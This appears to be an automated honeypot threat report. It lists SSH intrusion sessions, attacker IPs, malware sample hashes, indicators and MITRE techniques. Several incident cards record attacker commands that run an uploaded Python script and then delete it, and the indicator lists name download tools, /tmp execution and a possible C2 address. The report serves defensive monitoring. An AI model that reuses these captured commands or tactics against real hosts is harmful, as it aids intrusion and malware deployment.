| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-04 16:32 |
| **Last Seen** | 2026-07-04 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:32:06` | `cowrie.session.connect` |
| `2026-07-04 16:32:06` | `cowrie.client.version` |
| `2026-07-04 16:32:06` | `cowrie.client.kex` |
| `2026-07-04 16:32:06` | `cowrie.login.success` |
| `2026-07-04 16:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ecd1b4ba85

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-04 16:32 |
| **Last Seen** | 2026-07-04 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:32:06` | `cowrie.session.connect` |
| `2026-07-04 16:32:06` | `cowrie.client.version` |
| `2026-07-04 16:32:06` | `cowrie.client.kex` |
| `2026-07-04 16:32:06` | `cowrie.login.success` |
| `2026-07-04 16:32:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4753accfbc7f

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-04 16:32 |
| **Last Seen** | 2026-07-04 16:34 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:32:22` | `cowrie.session.connect` |
| `2026-07-04 16:32:22` | `cowrie.client.version` |
| `2026-07-04 16:32:23` | `cowrie.client.kex` |
| `2026-07-04 16:32:23` | `cowrie.login.success` |
| `2026-07-04 16:32:24` | `cowrie.session.file_upload` |
| `2026-07-04 16:32:25` | `cowrie.session.params` |
| `2026-07-04 16:32:25` | `cowrie.command.input` |
| `2026-07-04 16:32:25` | `cowrie.command.input` |
| `2026-07-04 16:32:25` | `cowrie.command.input` |
| `2026-07-04 16:32:25` | `cowrie.command.failed` |
| `2026-07-04 16:32:25` | `cowrie.log.closed` |
| `2026-07-04 16:32:25` | `cowrie.session.params` |
| `2026-07-04 16:32:25` | `cowrie.command.input` |
| `2026-07-04 16:32:26` | `cowrie.log.closed` |
| `2026-07-04 16:32:26` | `cowrie.session.params` |
| `2026-07-04 16:32:26` | `cowrie.command.input` |
| `2026-07-04 16:32:26` | `cowrie.log.closed` |
| `2026-07-04 16:32:27` | `cowrie.session.params` |
| `2026-07-04 16:32:27` | `cowrie.command.input` |
| `2026-07-04 16:32:27` | `cowrie.command.failed` |
| `2026-07-04 16:32:27` | `cowrie.command.failed` |
| `2026-07-04 16:33:28` | `cowrie.session.params` |
| `2026-07-04 16:33:28` | `cowrie.command.input` |
| `2026-07-04 16:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470c9ecbdd36

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 16:32 |
| **Last Seen** | 2026-07-04 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:32:40` | `cowrie.session.connect` |
| `2026-07-04 16:32:40` | `cowrie.client.version` |
| `2026-07-04 16:32:40` | `cowrie.client.kex` |
| `2026-07-04 16:32:40` | `cowrie.login.success` |
| `2026-07-04 16:32:40` | `cowrie.direct-tcpip.request` |
| `2026-07-04 16:32:40` | `cowrie.direct-tcpip.data` |
| `2026-07-04 16:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ac95112f59

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-04 16:34 |
| **Last Seen** | 2026-07-04 16:36 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:34:44` | `cowrie.session.connect` |
| `2026-07-04 16:34:44` | `cowrie.client.version` |
| `2026-07-04 16:34:44` | `cowrie.client.kex` |
| `2026-07-04 16:34:44` | `cowrie.login.success` |
| `2026-07-04 16:34:45` | `cowrie.session.file_upload` |
| `2026-07-04 16:34:46` | `cowrie.session.params` |
| `2026-07-04 16:34:46` | `cowrie.command.input` |
| `2026-07-04 16:34:46` | `cowrie.command.input` |
| `2026-07-04 16:34:46` | `cowrie.command.input` |
| `2026-07-04 16:34:46` | `cowrie.command.failed` |
| `2026-07-04 16:34:46` | `cowrie.log.closed` |
| `2026-07-04 16:34:47` | `cowrie.session.params` |
| `2026-07-04 16:34:47` | `cowrie.command.input` |
| `2026-07-04 16:34:47` | `cowrie.log.closed` |
| `2026-07-04 16:34:47` | `cowrie.session.params` |
| `2026-07-04 16:34:47` | `cowrie.command.input` |
| `2026-07-04 16:34:48` | `cowrie.log.closed` |
| `2026-07-04 16:34:48` | `cowrie.session.params` |
| `2026-07-04 16:34:48` | `cowrie.command.input` |
| `2026-07-04 16:34:48` | `cowrie.command.failed` |
| `2026-07-04 16:34:48` | `cowrie.command.failed` |
| `2026-07-04 16:35:49` | `cowrie.session.params` |
| `2026-07-04 16:35:49` | `cowrie.command.input` |
| `2026-07-04 16:36:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428751f7c100

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 16:37 |
| **Last Seen** | 2026-07-04 16:37 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:37:43` | `cowrie.session.connect` |
| `2026-07-04 16:37:45` | `cowrie.client.version` |
| `2026-07-04 16:37:45` | `cowrie.client.kex` |
| `2026-07-04 16:37:51` | `cowrie.login.success` |
| `2026-07-04 16:37:56` | `cowrie.session.params` |
| `2026-07-04 16:37:56` | `cowrie.command.input` |
| `2026-07-04 16:37:57` | `cowrie.log.closed` |
| `2026-07-04 16:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb13ab6ae13

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 16:44 |
| **Last Seen** | 2026-07-04 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:44:58` | `cowrie.session.connect` |
| `2026-07-04 16:44:58` | `cowrie.client.version` |
| `2026-07-04 16:44:58` | `cowrie.client.kex` |
| `2026-07-04 16:44:58` | `cowrie.login.success` |
| `2026-07-04 16:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f10f7dff211

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 16:44 |
| **Last Seen** | 2026-07-04 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:44:58` | `cowrie.session.connect` |
| `2026-07-04 16:44:58` | `cowrie.client.version` |
| `2026-07-04 16:44:58` | `cowrie.client.kex` |
| `2026-07-04 16:44:58` | `cowrie.login.success` |
| `2026-07-04 16:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faad03426fa9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 16:45 |
| **Last Seen** | 2026-07-04 16:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:45:01` | `cowrie.session.connect` |
| `2026-07-04 16:45:01` | `cowrie.client.version` |
| `2026-07-04 16:45:01` | `cowrie.client.kex` |
| `2026-07-04 16:45:01` | `cowrie.login.success` |
| `2026-07-04 16:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced936a8f48b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-04 16:45 |
| **Last Seen** | 2026-07-04 16:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:45:01` | `cowrie.session.connect` |
| `2026-07-04 16:45:01` | `cowrie.client.version` |
| `2026-07-04 16:45:01` | `cowrie.client.kex` |
| `2026-07-04 16:45:01` | `cowrie.login.success` |
| `2026-07-04 16:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c49cc4bb39d4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 16:50 |
| **Last Seen** | 2026-07-04 16:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 16:50:50` | `cowrie.session.connect` |
| `2026-07-04 16:50:51` | `cowrie.client.version` |
| `2026-07-04 16:50:51` | `cowrie.client.kex` |
| `2026-07-04 16:50:58` | `cowrie.login.success` |
| `2026-07-04 16:51:02` | `cowrie.session.params` |
| `2026-07-04 16:51:02` | `cowrie.command.input` |
| `2026-07-04 16:51:03` | `cowrie.log.closed` |
| `2026-07-04 16:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.81.2[.]201` | **75** | 2026-07-04 14:55 | 2026-07-04 16:54 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `36.212.129[.]250` | **7** | 2026-07-04 15:32 | 2026-07-04 15:46 | 14m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **5** | 2026-07-04 15:24 | 2026-07-04 16:54 | 2m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **3** | 2026-07-04 15:17 | 2026-07-04 16:04 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.242.104[.]81` | 1 | 2026-07-04 15:46 | 2026-07-04 15:46 | 37s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]105` | 1 | 2026-07-04 15:18 | 2026-07-04 15:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.52.55[.]240` | 1 | 2026-07-04 15:48 | 2026-07-04 15:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `119.96.223[.]148` | 1 | 2026-07-04 16:29 | 2026-07-04 16:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `180.184.178[.]165` | 1 | 2026-07-04 15:23 | 2026-07-04 15:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.44.72[.]56` | 1 | 2026-07-04 16:28 | 2026-07-04 16:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | 1 | 2026-07-04 16:29 | 2026-07-04 16:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-07-04 15:11 | 2026-07-04 15:12 | 54s | 0 | `T1592` | 🟢 LOW |
| `45.153.34[.]235` | 1 | 2026-07-04 15:10 | 2026-07-04 15:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.167.233[.]27` | 1 | 2026-07-04 15:29 | 2026-07-04 15:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]170` | 1 | 2026-07-04 16:06 | 2026-07-04 16:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-04 15:34 | 2026-07-04 15:35 | 53s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 80/100 | 🔴 HIGH | **26/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `104.152.52[.]105` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `106.52.55[.]240` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 17 |
| `102.210.149[.]236` | KE | New IP First Block2 | **100** ⚠️ | 50 |
| `103.242.104[.]81` | ID | PT Lintas Jaringan Nusantara | **100** ⚠️ | 5 |
| `206.81.2[.]201` | US | DigitalOcean, LLC | **100** ⚠️ | 9 |
| `103.186.1[.]158` | ID | CV Ansa Project | **100** ⚠️ | 2 |
| `45.167.233[.]27` | BR | PIONEIRA COMUNICACAO MULTIMIDIA LTDA | **100** ⚠️ | 5 |
| `182.44.72[.]56` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 407 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 393 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |

---

## 🔕 False Positive Summary (93 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 92 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 588 cases |
| Tool 34  | Credential Extractor        | ✅ 418 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 33 IPs enriched |
